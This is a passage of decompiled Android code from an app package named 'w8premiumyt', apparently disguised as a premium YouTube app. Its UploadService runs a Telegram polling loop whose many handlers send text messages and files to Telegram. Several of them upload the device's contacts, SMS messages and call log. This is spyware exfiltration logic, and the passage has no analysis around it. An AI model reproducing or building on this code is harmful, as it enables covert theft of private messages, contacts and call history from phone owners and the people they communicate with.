        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$69", f = "UploadService.kt", i = {}, l = {1837}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass69 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $url;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass69(UploadService uploadService, String str, Continuation<? super AnonymousClass69> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$url = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass69(this.this$0, this.$url, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۲String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch6$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$url, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$70, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$70", f = "UploadService.kt", i = {}, l = {1849}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass70 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass70(UploadService uploadService, Continuation<? super AnonymousClass70> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass70(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch8$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$71, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$71", f = "UploadService.kt", i = {}, l = {1853}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass71 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass71(UploadService uploadService, Continuation<? super AnonymousClass71> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass71(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch9$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$72, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$72", f = "UploadService.kt", i = {}, l = {1857}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass72 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass72(UploadService uploadService, Continuation<? super AnonymousClass72> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass72(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch10$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$73, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$73", f = "UploadService.kt", i = {}, l = {1858}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass73 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass73(UploadService uploadService, Continuation<? super AnonymousClass73> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass73(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getContactsInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۳String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch10$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$74, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$74", f = "UploadService.kt", i = {}, l = {1862}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass74 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass74(UploadService uploadService, Continuation<? super AnonymousClass74> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass74(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch11$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$75, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$75", f = "UploadService.kt", i = {}, l = {1866}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass75 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass75(UploadService uploadService, Continuation<? super AnonymousClass75> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass75(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch12$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$76, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$76", f = "UploadService.kt", i = {}, l = {1867}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass76 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass76(UploadService uploadService, Continuation<? super AnonymousClass76> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass76(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getSMSInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۵String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch12$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$77, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$77", f = "UploadService.kt", i = {}, l = {1871}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass77 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass77(UploadService uploadService, Continuation<? super AnonymousClass77> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass77(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch13$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$78, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$78", f = "UploadService.kt", i = {}, l = {1875}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass78 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass78(UploadService uploadService, Continuation<? super AnonymousClass78> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass78(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch14$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$79, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$79", f = "UploadService.kt", i = {}, l = {1876}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass79 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass79(UploadService uploadService, Continuation<? super AnonymousClass79> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass79(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getCallLogInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۷String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch14$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$80, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$80", f = "UploadService.kt", i = {}, l = {1880}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass80 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass80(UploadService uploadService, Continuation<? super AnonymousClass80> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass80(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch15$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$81, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$81", f = "UploadService.kt", i = {}, l = {1884}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass81 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass81(UploadService uploadService, Continuation<? super AnonymousClass81> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass81(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch16$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$82, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$82", f = "UploadService.kt", i = {}, l = {1889}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass82 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass82(UploadService uploadService, Continuation<? super AnonymousClass82> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass82(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch17$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$83, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
